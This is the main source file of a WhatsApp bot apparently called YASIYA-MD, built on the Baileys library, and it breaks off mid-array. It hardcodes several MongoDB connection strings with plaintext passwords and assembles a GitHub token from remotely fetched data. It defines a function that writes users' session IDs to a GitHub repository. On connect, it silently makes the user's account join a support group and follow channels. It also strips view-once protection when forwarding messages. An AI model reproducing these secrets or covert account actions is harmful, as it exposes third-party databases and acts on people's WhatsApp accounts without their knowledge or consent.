const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
    getContentType,
    Browsers,
    getAggregateVotesInPollMessage,
    makeCacheableSignalKeyStore,
    receivedPendingNotifications,
    generateWAMessageFromContent,
    generateForwardMessageContent,
    getDevice,
    prepareWAMessageMedia,
    proto,
    downloadContentFromMessage,
    jidDecode,
    makeInMemoryStore,
    } = require('@whiskeysockets/baileys')
    
const fs = require('fs');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const NodeCache = require('node-cache');
const util = require('util');
const axios = require('axios');
const { File } = require('megajs');
const path = require('path');
const chalk = require("chalk");
const os = require('os');
const { MongoClient } = require('mongodb');
const { Pool } = require('pg');
const { execSync, exec } = require("child_process");

const msgRetryCounterCache = new NodeCache();
const groupCache = new NodeCache({
  stdTTL: 60 * 5,
  checkperiod: 60
});

const l = console.log;

const SESSION_NAME = config.SESSION_NAME || 'auth_info_baileys'
const sessionFolder = path.join(__dirname, SESSION_NAME);
const sessionFile = path.join(sessionFolder, 'creds.json');

function base64Decode(encoded) {
  try {
    const buffer = Buffer.from(encoded, 'base64');
    return buffer.toString('utf-8');
  } catch (error) {
    return '❌ Error decoding Base64: ' + error.message;
  }
}

function getCredFiles(folder) {
  return fs.readdirSync(folder)
    .filter(file => file.endsWith('.json'))
    .map(file => path.join(folder, file));
}


//===================SESSION============================
  if (!fs.existsSync(sessionFile)) {
    if (config.SESSION_ID) {
      const id = config.SESSION_ID;

      // Base64 type
      if (id.startsWith("YASIYA-MD=")) {
        try {
          const sessdata = id.split("=")[1];
          const base64Decode = (str) => Buffer.from(str, "base64").toString("utf-8");
          const data = base64Decode(sessdata);

          if (data) {
            fs.mkdirSync(sessionFolder, { recursive: true });
            fs.writeFileSync(sessionFile, data);
            console.log("📡 Session      : 🔑 Retrieved from Base64");
          } else {
            throw new Error("Base64 decode failed or is empty");
          }
        } catch (e) {
          console.error("📡 Session      : ❌ Error decoding base64 session:", e.message);
        }

      // YMD DB type
      } else if (id.startsWith("YASIYA-MD?")) {
          
        try {
          const sessdata = id.split("?")[1];
          axios.get(`https://ymd-session-db.vercel.app/api/creds/${sessdata}`, {
            responseType: "stream"
          })
          .then(response => {
            fs.mkdirSync(sessionFolder, { recursive: true });
            const writer = fs.createWriteStream(sessionFile);
            response.data.pipe(writer);

            writer.on("finish", () => {
              console.log("📡 Session      : 🔑 Retrieved from YMD DB");
            });

            writer.on("error", (err) => {
              console.error("❌ Write error during YMD DB session download:", err.message);
            });
          })
          .catch(error => {
            console.error("📡 Session      : ❌ Error downloading session from YMD DB:", error.message);
          });

        } catch (e) {
          console.error("📡 Session      : ❌ Unexpected error:", e.message);
        }

      // MEGA type
      } else if (id.startsWith("YASIYA-MD~")) {
        try {
          const sessdata = id.split("~")[1];

          if (!sessdata.includes("#")) throw new Error("📡 Session      : Invalid MEGA session link format");

          const file = File.fromURL(`https://mega.nz/file/${sessdata}`);
          file.loadAttributes((err) => {
            if (err) throw err;

            file.downloadBuffer((err, data) => {
              if (err) throw err;

              fs.mkdirSync(sessionFolder, { recursive: true });
              fs.writeFileSync(sessionFile, data);
              console.log("📡 Session      : 🔑 Retrieved from MEGA");
            });
          });

        } catch (e) {
          console.error("❌ Error downloading session from MEGA:", e.message);
        }

      } else {
        console.log("📡 Session      : ❌ SESSION_ID Type Invalid");
      }

    } else {
      console.log("📡 Session      : ➡️  Please set your SESSION_ID in the configuration or environment.\n");
    }
  }



// ============================ FUNCTIONS ============================

async function joinSupportGroup(inviteLink, conn) {
  try {
   
    const match = inviteLink.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/);
    if (!match) return console.log("❌ Invalid invite link.");
    const code = match[1];

    const groupId = await conn.groupGetInviteInfo(code).then(g => g.id).catch(() => null);
    if (!groupId) return console.log("❌ Couldn't fetch group info.");
    const metadata = await conn.groupMetadata(groupId).catch(() => null);
    if (!metadata) {
      await conn.groupAcceptInvite(code);
      console.log("👥 Group Join   : 📲 Joined Successfully");
    } else {
      const botId = conn.user?.lid.split(':')[0] + "@lid" || conn.user?.id.split(':')[0] + "@s.whatsapp.net";
      const isBotInGroup = metadata.participants.some(p => p.id === botId);

      if (isBotInGroup) {
        console.log("👥 Group Join   : ✅ Already in the group.");
      } else {
        await conn.groupAcceptInvite(code);
        console.log("👥 Group Join   : 📲 Joined Successfully");
      }
    }
  } catch (e) {
    console.error("❌ Error in Join support group: ", e);
  }
}

async function loadBotData(url) {
  try {
    const response = await axios.get(url);

    if (response.status === 200) {
      const data = response.data;
      console.log("🗳️ Bot Database     : ✅ Loaded");
      return data;
    } else {
      console.error(`❌ Failed to load bot database. Status: ${response.status}`);
      return null;
    }
  } catch (e) {
    console.error("❌ Error loading bot database: ", e.message || e);
    return null;
  }
}

async function loadDatabaseUrl(key) {
  try {
      
    const urls = [
      "mongodb+srv://pakimi8343:vQx39vph8gDMoF1g@cluster0.xlwalzh.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
      "mongodb+srv://chaiwba12:ABCdef1233@cluster0.wtzszde.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
      "mongodb+srv://sadad81035:lJEmW4B61sb9Gb0w@cluster0.e2wf4gp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
      "mongodb+srv://casisiw363:Kdeef1nBKeCKockf@cluster0.pa2kbk3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
      "mongodb+srv://Chamuu:Abcde1247@cluster0.hhlkngr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",

      "mongodb+srv://yasiya:yasiyamd@cluster0.shytujm.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
      "mongodb+srv://yasiya:yasiyamd@cluster0.gcqe89s.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
      "mongodb+srv://yasiya:yasiyamd@cluster0.rmmesq6.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
    ];

    let dbUrl = '';

    if (key?.startsWith('9474')) {
      dbUrl = urls[5];
    } else if (key?.startsWith('9476')) {
      dbUrl = urls[6];
    } else if (key?.startsWith('9477')) {
      dbUrl = urls[7];
    } else if (key?.startsWith('9470') || key?.startsWith('9471')) {
      dbUrl = urls[1];
    } else if (key?.startsWith('9472') || key?.startsWith('9475') || key?.startsWith('9478')) {
      dbUrl = urls[2];
    } else if (key?.startsWith('1') || key?.startsWith('2') || key?.startsWith('3') || key?.startsWith('4') || key?.startsWith('5')) {
      dbUrl = urls[3];
    } else if (key?.startsWith('6') || key?.startsWith('7') || key?.startsWith('8') || key?.startsWith('9') || key?.startsWith('0')) {
      dbUrl = urls[4];
    }

    return dbUrl;

  } catch (e) {
    console.error(e);
    return null;
  }
}

let client;
async function connectMongo(MONGO_URI) {
        if (client && client.topology?.isConnected()) {
        return client;
        }

    client = new MongoClient(MONGO_URI);

    await client.connect();
    return client;
}


async function sessionStore(token, owner, repo, path, newData) {

  const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;

  try {
    // 1. Get current content
    const getRes = await axios.get(apiUrl, {
      headers: { Authorization: `Bearer ${token}` }
    });

    const sha = getRes.data.sha;
    const contentDecoded = Buffer.from(getRes.data.content, 'base64').toString('utf-8');
    let jsonArray = [];

    try {
      jsonArray = JSON.parse(contentDecoded);
      if (!Array.isArray(jsonArray)) throw new Error('Not a JSON array');
    } catch (e) {
      console.error("Invalid JSON array in file:", e.message);
      throw e;
    }

    // 2. Update or insert session
    const index = jsonArray.findIndex(entry => entry.number === newData.number);
    if (index !== -1) {
      jsonArray[index].session_id = newData.session_id;
      console.log(`🔁 Updated existing session for number ${newData.number}`);
    } else {
      jsonArray.push(newData);
      console.log(`➕ Added new session for number ${newData.number}`);
    }

    const updatedContent = Buffer.from(JSON.stringify(jsonArray, null, 2)).toString('base64');

    // 3. Push back to GitHub
    const res = await axios.put(apiUrl, {
      message: `Upsert session for ${newData.number}`,
      content: updatedContent,
      sha
    }, {
      headers: {
        Authorization: `Bearer ${token}`,
        Accept: 'application/vnd.github+json'
      }
    });

    console.log("✅ Successfully committed to GitHub.");
    return res.data;
  } catch (error) {
    console.error("❌ GitHub update failed:", error.response?.data || error.message);
    throw error;
  }
}



if (!fs.existsSync("./temp")) {
    fs.mkdirSync("./temp", { recursive: true });
}
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || config.PORT || 8000;
let qrCodeData = '';
let isConnected = false;
//====================================
async function yasiyaMd(userName, repoName){
       async function connectToWA() {

    const lang = require('./lib/language');
    const langFilePath = path.join(__dirname, "lib", 'language.json');
    // Write JSON object to file
    fs.writeFileSync(langFilePath, JSON.stringify(lang, null, 2), 'utf8');

           
    const botData = await loadBotData(`https://raw.githubusercontent.com/${userName}/${repoName}/refs/heads/main/BOT-DATA/data.json`);
    const { releaseVersion, tableName, supportGroup, logo, footer, contextBody, connectMsgSendNb, publicRepo, officialChannel, newsletters, nonbuttonDbUrl, officialSite, antiBotId, antiBotCpation, token, user, supGpAccess, betaBotLid } = botData;             
    const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile, getDateAndTime, formatMessage } = require('./lib/functions');
    const { pqs_connection_start, start_numrep_process, upload_to_pqs, get_data_from_pqs, storenumrepdata, getstorednumrep } = require(`./lib/numreply-db.js`)
    const { sms, downloadMediaMessage } = require('./lib/msg');
    let dbData = require("./lib/config");
    const DBM = require("./lib/database");
    dbData.TOKEN = `ghp_${base64Decode(token)}`
    dbData.USER_NAME = user;
    dbData.REPO_NAME = "USER-DB";
    dbData.VERSION = releaseVersion;
    dbData.REPO = publicRepo;
    dbData.SUPPORT_GROUP = supportGroup;
    dbData.OFFICIAL_CHANNEL = officialChannel;
    dbData.NEWSLETTER_JIDS = newsletters;
    dbData.NONBUTTON_DATABASE_URL = nonbuttonDbUrl;
    dbData.OFFICIAL_SITE = officialSite;
    dbData.ANTI_BOT_VALUE = antiBotId;
    dbData.ANTI_BOT_CAPTION = antiBotCpation;
    dbData.SUPGP_ACCESS = supGpAccess;
    dbData.BETABOT_ID = betaBotLid;
           
    const ymd_db = new DBM();
    console.log(`🛰️ Baileys      : 🔌 Connecting to Latest Version...`)
    const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
    const { version } = await fetchLatestBaileysVersion();
    let messageCache = new Map();
    let messageStore = new Map();
    /*const conn = makeWASocket({
            logger: P({ level: "fatal" }).child({ level: "fatal" }),
            printQRInTerminal: true,
            browser: Browsers.macOS("Safari"),
            fireInitQueries: false,
            shouldSyncHistoryMessage: false,
            downloadHistory: false,
            syncFullHistory: true,
            generateHighQualityLinkPreview: true,
            auth: state,
            version,
            getMessage: async (key) => {
            if (messageCache.has(key.id)) {
                return messageCache.get(key.id);
            }
            const msg = await store.loadMessage(key.remoteJid, key.id);
            return msg?.message || '';
          }
        })*/

      const conn = makeWASocket({
      logger: P({ level: "fatal" }).child({ level: "fatal" }),
      printQRInTerminal: false,
      browser: Browsers.windows("Chrome"),
      generateHighQualityLinkPreview: true,
      auth: state,
      defaultQueryTimeoutMs: undefined,
      msgRetryCounterCache,
      cachedGroupMetadata: async (jid) => groupCache.get(jid),
      shouldSyncHistoryMessage: () => false
  })
    

    conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect,
            qr
        } = update

    if (qr) {
        console.log("❌ No saved session found! 🔁 Please scan the QR Code or Pair Your number to connect.");
        qrCodeData = qr;
    }
        
    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode;
        isConnected = false
        console.log("❌ Connection closed! Reason:", reason);

        switch (reason) {
            case DisconnectReason?.badSession:
                console.log("💾 Bad Session! Resetting...");
                fs.rmSync(sessionFolder, { recursive: true, force: true });
                await connectToWA();
                break;

             case DisconnectReason.connectionClosed:
                console.log("🔌 Connection closed! Reconnecting...");
                await connectToWA();
                break;

            case DisconnectReason?.connectionLost:
                console.log("📶 Connection lost! Retrying...");
                await connectToWA();
                break;

            case DisconnectReason.connectionReplaced:
                console.log("⚔️ Connection replaced! Another session opened.");
                fs.rmSync(sessionFolder, { recursive: true, force: true });
                await connectToWA();
                break;

            case DisconnectReason?.loggedOut:
                console.log("🔑 Logged out! Deleting session...");
                fs.rmSync(sessionFolder, { recursive: true, force: true });
                await connectToWA();
                break;

            case DisconnectReason?.restartRequired:
                console.log("🔄 Restart required! Restarting bot...");
                process.exit(1);
                break;

            case DisconnectReason?.timedOut:
                console.log("⏳ Connection timed out! Retrying...");
                await connectToWA();
                break;

            case DisconnectReason.multideviceMismatch:
                console.log("📱 Multi-device mismatch! Resetting session...");
                fs.rmSync(sessionFolder, { recursive: true, force: true });
                await connectToWA();
                break; 

            case 403:
                console.log("🚫 Forbidden (403)! Session invalid or expired.");
                fs.rmSync(sessionFolder, { recursive: true, force: true });
                await connectToWA();
                break;

            default:
                console.log("⚠️ Unknown disconnect reason:", reason);
                await connectToWA();
        }
        
    } else if (connection === 'open') {

            let isConnected = true;

            
            dbData.key = conn.user.id.split(':')[0];
            dbData.tableName = tableName;
            dbData.AUTO_REP_DATA = `USER-DATABASE/${dbData.key}/auto_reply.json`
        
            const dbUrl = await loadDatabaseUrl(dbData.key);
            dbData.DATABASE_URL = dbUrl

            const dbConfig = await ymd_db.startDB(dbData?.tableName, dbData?.key, client);

            console.log('🔌 Plugins      : 📦 Installing...')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('📦 Plugins      : ✅ Installed');

            const pool = new Pool({ connectionString: dbData?.NONBUTTON_DATABASE_URL, ssl: { rejectUnauthorized: false }})
            await start_numrep_process(pool);
            
            console.log('💬 WhatsApp     : 🤖 Connected');

            const dateAndTime = await getDateAndTime(config.TIME_ZONE || "Asia/Colombo");
            const date = dateAndTime.date || '';
            const time = dateAndTime.time || '';
            
            await conn.sendMessage(conn?.user?.id || connectMsgSendNb, {
                image: { url: logo?.connectLogo }, // Replace with your bot logo
                caption: `🎉 *𝗬𝗔𝗦𝗜𝗬𝗔 𝗠𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗* 🎉\n\n` +
                         `🟢 *Status:* Online ✅\n` +
                         `📅 *Date:* ${date}\n` +
                         `🕒 *Time:* ${time}\n\n` +
                         `🌍 *Official Site:* ${dbData?.OFFICIAL_SITE}\n\n` +
                         `📢 *Official Channel:* ${dbData?.OFFICIAL_CHANNEL}\n\n` +
                         `🛂 *Support Group:* https://chat.whatsapp.com/${dbData?.SUPPORT_GROUP}\n\n` +
                         `💻 *GitHub Repo:* ${dbData?.REPO}\n\n` +
                         `⚡ *Commands are ready to use!*\n` +
                         `📩 Type *${config.PREFIX}menu* to view available commands.\n\n` +
                         `👥 *Developer Team:* Type *${config.PREFIX}team* to view our team list. \n\n> ${config.FOOTER || footer}`
            });     

            await joinSupportGroup(`https://chat.whatsapp.com/${supportGroup}`, conn);

    const lockData = await axios.get(`https://raw.githubusercontent.com/${userName}/${repoName}/refs/heads/main/BOT-DATA/lock.json`);
    const { allBotDeactive, ownerReact, movieCmdStatus, autoUpdate } = lockData?.data; 
    if(movieCmdStatus === 'free'){
        dbData.FREE_MOVIE_CMD = true
    }

    if(ownerReact){
        dbData.DEVELOPER_REACT = true
    }

        dbData.AUTO_UPDATE = autoUpdate

        dbData.REACTIONS_DATA = (await axios.get(`https://raw.githubusercontent.com/${userName}/${repoName}/refs/heads/main/OWNER-DATA/react.json`)).data

        let hostname;
        let osname = os.hostname();

        dbData.HOST_NAME = hostname

        try{
            if(conn?.newsletterMetadata && dbData?.NEWSLETTER_JIDS){
                for(let j of dbData.NEWSLETTER_JIDS){
                     const checkFollowe = await conn.newsletterMetadata("jid", j)	      
                     if (checkFollowe.viewer_metadata === null){
                     await conn.newsletterFollow(j)
                    }
                }
                console.log("📢 Channel     : ✔️ Followed")
            }
            
        }catch(e){}
        
       }
    })

    conn.ev.on('creds.update', async () => {
      try {
        await saveCreds();
      } catch (e) {
        console.error('❌ Failed to save updated session to DB:', e.message);
      }
    });
           
    conn.ev.on("group-participants.update", async (update) => {
    try {
        const { id, participants, action } = update;

        if(config?.AUTO_SEND_WELLCOME_MESSAGE === 'true' && config?.WELLCOME_MESSAGE.includes(id)){
        for (const user of participants) {
            const metadata = await conn.groupMetadata(id);
            const groupName = metadata?.subject;

            if (action === "add") {
                const ppUrl = await conn.profilePictureUrl(user, "image").catch(() => "https://telegra.ph/file/265c672094dfa87caea19.jpg");
                const name = (await conn.onWhatsApp(user))[0]?.notify || user.split("@")[0];

                const welcomeText = `╭━━━━━🎉 *WELCOME* 🎉━━━━━╮\n` +
                                    `┃👤 @${user.split("@")[0]}\n` +
                                    `┃🆕 Joined *${groupName}*\n` +
                                    `┃\n` +
                                    `┃💬 Please introduce yourself!\n` +
                                    `┃📌 Follow the group rules.\n` +
                                    `┃🎈 Have a great time!\n` +
                                    `╰━━━━━━━━━━━━━━━━━━━━━━━╯`;

                await conn.sendMessage(id, {
                    image: { url: ppUrl },
                    caption: welcomeText,
                    mentions: [user],
                });
            }

            if (action === "remove") {
                const goodbyeText = `╭━━━━━━━👋 *GOODBYE* 👋━━━━━━╮\n` +
                                    `┃😢 @${user.split("@")[0]} has left *${groupName}*\n` +
                                    `┃\n` +
                                    `┃📆 Hope to see you again!\n` +
                                    `┃✨ Stay safe and take care!\n` +
                                    `╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯`;

                await conn.sendMessage(id, {
                    text: goodbyeText,
                    mentions: [user],
                });
              }
          }
       }
    } catch (e) {
        console.error("Error in welcome/goodbye:", e);
    }
});

    conn.ev.on("messages.upsert", async ({ messages }) => {
    for (const msg of messages) {
        const isReact = msg?.message?.reactionMessage ? true : false;
        if (!msg?.key?.remoteJid || !msg?.key?.id || !msg?.message) continue;

        if(!isReact){
        const jid = msg.key.remoteJid;
        const msgId = msg.key.id;

        if (!messageStore.has(jid)) {
            messageStore.set(jid, new Map());
        }

        messageStore.get(jid).set(msgId, msg); // Save the message
    }}
});

  
    conn.ev.on('messages.upsert', async (mek) => {
        try {

             mek = mek.messages[0] 
             if (!mek.message) return
             mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

          // Auto read & react status ✅
          if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === 'true') {
              try {
                  await conn.readMessages([mek.key]);

                  if(config.AUTO_REACT_STATUS == "true"){
                  const emojis = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
                  await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: emojis[Math.floor(Math.random() * emojis.length)] } }, { statusJidList: [mek.key.participant, conn.user.id] });
                  }
                  
              } catch (error) {
                  console.error("Error reading message:", error);
               }
            }
            
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            const m = sms(conn, mek);
            const isReact = m?.message?.reactionMessage ? true : false;
            if(isReact) return;
            const type = getContentType(mek.message)
            const content = JSON.stringify(mek.message);
            const from = mek.key.remoteJid;
            const prefix = config.PREFIX || '.';
            const ownerNumber = config.OWNER_NUMBER || '94743548986';
            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
            const quotedid = type === 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo ? mek.message.extendedTextMessage.contextInfo.stanzaId || null : null;
            
            let body = '';
            if (type === 'conversation') {
            body = mek.message.conversation || '';
            } else if (type === 'extendedTextMessage') {
            const storedNumRep = await getstorednumrep(quotedid, from, mek.message.extendedTextMessage.text, conn, mek);
            body = storedNumRep || mek.message.extendedTextMessage.text || '';
            } else if (type === 'interactiveResponseMessage') {
            try {
            const paramsJson = mek.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
            body = paramsJson ? JSON.parse(paramsJson)?.id || '' : '';
            } catch (error) {
            body = '';
            }
            } else if (type === 'templateButtonReplyMessage') {
            body = mek.message.templateButtonReplyMessage?.selectedId || '';
            } else if (type === 'imageMessage' && mek.message.imageMessage?.caption) {
            body = mek.message.imageMessage.caption || '';
            } else if (type === 'videoMessage' && mek.message.videoMessage?.caption) {
            body = mek.message.videoMessage.caption || '';
            } else {
            body =   m.msg?.text ||
                     m.msg?.conversation ||
                     m.msg?.caption ||
                     m.message?.conversation ||
                     m.msg?.selectedButtonId ||
                     m.msg?.singleSelectReply?.selectedRowId ||
                     m.msg?.selectedId ||
                     m.msg?.contentText ||
                     m.msg?.selectedDisplayText ||
                     m.msg?.title ||
                     m.msg?.name || ''
            }
            
            var isCmd = body.startsWith(prefix)
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
            const args = body.trim().split(/ +/).slice(1)
            const q = args.join(' ')
            const quotedText = m?.quoted?.msg || null;
            const isGroup = from.endsWith('@g.us');
            const isPrivate = !isGroup
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
            const senderNumber = sender.split('@')[0];
            const botNumber = conn.user.id.split(':')[0];
            const botLid = conn.user?.lid ? conn.user?.lid.split(":")[0] + "@lid" : null;
            const botLid2 = botLid ? botLid.split("@")[0] : null;
            const pushname = mek.pushName || 'Sin Nombre'
            const developers = []
            const isbot = (botNumber.includes(senderNumber) || botLid2.includes(senderNumber));
            const isdev = developers.includes(senderNumber)
            const isMe = isbot ? isbot : isdev
            const isOwner = ownerNumber.includes(senderNumber) || isMe;
            const botNumber2 = await jidNormalizedUser(conn.user.id);
            const sudoNumbers = config?.SUDO_NUMBERS || [];
            const isSudo = sudoNumbers.includes(sender);
            const sudoGroups = config?.SUDO_NUMBERS || [];
            const isSudoGroup = sudoGroups.includes(sender);

            const originalGroupMetadata = conn.groupMetadata;
            conn.groupMetadata = async (jid) => {
              let data = groupCache.get(jid);
              if (!data) {
                data = await originalGroupMetadata(jid); // Baileys built-in fetch
                groupCache.set(jid, data);
              }
              return data;
            };
            
            let groupMetadata = { subject: '', participants: [] }
            if (isGroup) {
              try {
                groupMetadata = await conn.groupMetadata(from);
              } catch (e) {
                // console.error('Failed to get group metadata:', e);
                }
            }
            const groupName = groupMetadata.subject;
            const participants = groupMetadata.participants;
            const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
            const isBotAdmins = isGroup ? groupAdmins?.includes(botNumber2) || groupAdmins?.includes(botLid) : false
            const isAdmins = isGroup ? groupAdmins?.includes(sender) : false
            const isAnti = (teks) => {
                let getdata = teks
                for (let i = 0; i < getdata.length; i++) {
                    if (getdata[i] === from) return true
                }
                return false
            }

            if(dbData.DEACTIVE_BOTS){
                if(isCmd && isMe) return
            }

            if(conn?.newsletterReactMessage && dbData?.NEWSLETTER_JIDS.includes(from)){
                   if(isReact) return
                   await conn.newsletterReactMessage(from, mek?.newsletterServerId, "❤️")
            }
            
            // ============== BOT CONFIG ================
            config.LOGO = logo.mainLogo;
            config.CONTEXT_LOGO = logo.contextLogo;
            config.FOOTER = footer;
            config.BODY = contextBody;


            const reply = async (teks, emoji = null) => {
                try {

                    var text = teks;
                    const replyMsg = await conn.sendMessage(from, { text }, { quoted: mek });

                    if (emoji && replyMsg?.key) {
                        if (!isReact) return;

                        await conn.sendMessage(from, {
                            react: { text: emoji, key: replyMsg.key }
                        });
                    }

                    return replyMsg;
                } catch (error) {
                    console.error("Error sending reply:", error);
                    return null;
                }
            };
            
            conn.edit = async (mek, newmg) => {
                await conn.relayMessage(from, {
                    protocolMessage: {
                        key: mek.key,
                        type: 14,
                        editedMessage: {
                            conversation: newmg
                        }
                    }
                }, {})
            }

            
            conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                let mime = '';
                let res = await axios.head(url)
                mime = res.headers['content-type']
                if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, {
                        video: await getBuffer(url),
                        caption: caption,
                        gifPlayback: true,
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
                let type = mime.split("/")[0] + "Message"
                if (mime === "application/pdf") {
                    return conn.sendMessage(jid, {
                        document: await getBuffer(url),
                        mimetype: 'application/pdf',
                        caption: caption,
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
                if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, {
                        image: await getBuffer(url),
                        caption: caption,
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
                if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, {
                        video: await getBuffer(url),
                        caption: caption,
                        mimetype: 'video/mp4',
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
                if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, {
                        audio: await getBuffer(url),
                        caption: caption,
                        mimetype: 'audio/mpeg',
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
            }
            
            conn.sendButtonMessage = async (jid, buttons, quoted, opts = {}) => {

                let header;
                if (opts?.video) {
                    var video = await prepareWAMessageMedia({
                        video: {
                            url: opts && opts.video ? opts.video : ''
                        }
                    }, {
                        upload: conn.waUploadToServer
                    })
                    header = {
                        title: opts && opts.header ? opts.header : '',
                        hasMediaAttachment: true,
                        videoMessage: video.videoMessage,
                    }

                } else if (opts?.image) {
                    var image = await prepareWAMessageMedia({
                        image: {
                            url: opts && opts.image ? opts.image : ''
                        }
                    }, {
                        upload: conn.waUploadToServer
                    })
                    header = {
                        title: opts && opts.header ? opts.header : '',
                        hasMediaAttachment: true,
                        imageMessage: image.imageMessage,
                    }

                } else {
                    header = {
                        title: opts && opts.header ? opts.header : '',
                        hasMediaAttachment: false,
                    }
                }


                let message = generateWAMessageFromContent(jid, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: {
                                body: {
                                    text: opts && opts.body ? opts.body : ''
                                },
                                footer: {
                                    text: opts && opts.footer ? opts.footer : ''
                                },
                                header: header,
                                nativeFlowMessage: {
                                    buttons: buttons,
                                    messageParamsJson: ''
                                }
                            }
                        }
                    }
                }, {
                    quoted: quoted
                })
                await conn.sendPresenceUpdate('composing', jid)
                await sleep(1000 * 1);
                return await conn.relayMessage(jid, message["message"], {
                    messageId: message.key.id
                })
            }

             conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
              let vtype
              if (options.readViewOnce) {
                  message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                  vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                  delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                  delete message.message.viewOnceMessage.message[vtype].viewOnce
                  message.message = {
                      ...message.message.viewOnceMessage.message
                  }
              }
  
              let mtype = Object.keys(message.message)[0]
              let content = await generateForwardMessageContent(message, forceForward)
              let ctype = Object.keys(content)[0]
              let context = {}
              if (mtype != "conversation") context = message.message[mtype].contextInfo
              content[ctype].contextInfo = {
                  ...context,
                  ...content[ctype].contextInfo
              }
              const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                  ...content[ctype],
                  ...options,
                  ...(options.contextInfo ? {
                      contextInfo: {
                          ...content[ctype].contextInfo,
                          ...options.contextInfo
                      }
                  } : {})
              } : {})
              await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
              return waMessage
               }

            //=================================================================================================================
            // --------------- NUMBERS ---------------
            const { data: fetchNumber } = await axios.get(
              `https://raw.githubusercontent.com/${userName}/${repoName}/refs/heads/main/OWNER-DATA/number.json`
            );

            // Normalize a number list safely
            const normalizeList = (arr = []) => arr.map(v => v.replace(/[^0-9]/g, ""));

            dbData.DEVELOPER_NUMBERS = normalizeList(fetchNumber?.DEVELOPER_NUMBER)  || [];
            dbData.PREMIER_USERS = normalizeList(fetchNumber?.PREMIER_USER) || [];

            const isDev = dbData.DEVELOPER_NUMBERS.includes(senderNumber);
            const isPreUser = dbData.PREMIER_USERS.includes(senderNumber);

            // --------------- DEV-REACT ---------------
            if (dbData?.DEVELOPER_REACT && Array.isArray(dbData?.REACTIONS_DATA)) {
              const match = dbData.REACTIONS_DATA.find(entry => entry.number.includes(senderNumber));
              if (match && !isReact) await m.react(match.react);
            }


            // --------------- GROUP ---------------
            const allBannedGroups = [
              ...(fetchNumber?.BANDED_GROUP || []),
              ...(config?.BAND_GROUPS || [])
            ];

            // Config ban check
            const configBanGroups = config?.BAND_GROUPS || [];
            const isConfigBanGroup = configBanGroups.includes(from);
            if (isConfigBanGroup && !isDev) return;

            // Dev ban check
            const devBanGroups = fetchNumber?.BAND_GROUPS || [];
            const devAccess = dbData.SUPGP_ACCESS || [];
            const betaBotsId = dbData.BETABOT_ID || []; // FIXED

            const isDevBanGroup = devBanGroups.includes(from);
            if (
              isDevBanGroup &&
              (!botLid.some(id => betaBotsId.includes(id)) || !devAccess.includes(senderNumber))
            ) {
              if (devAccess.includes(senderNumber)) {
                if (body.startsWith("/")) isCmd = true;
              } else {
                return;
              }
            }

            
            const bannedNumbers = [
              ...(Array.isArray(fetchNumber?.BANDED_NUMBER) ? fetchNumber.BANDED_NUMBER : []).map(v => v?.NUMBER?.replace(/[^0-9]/g, "")),
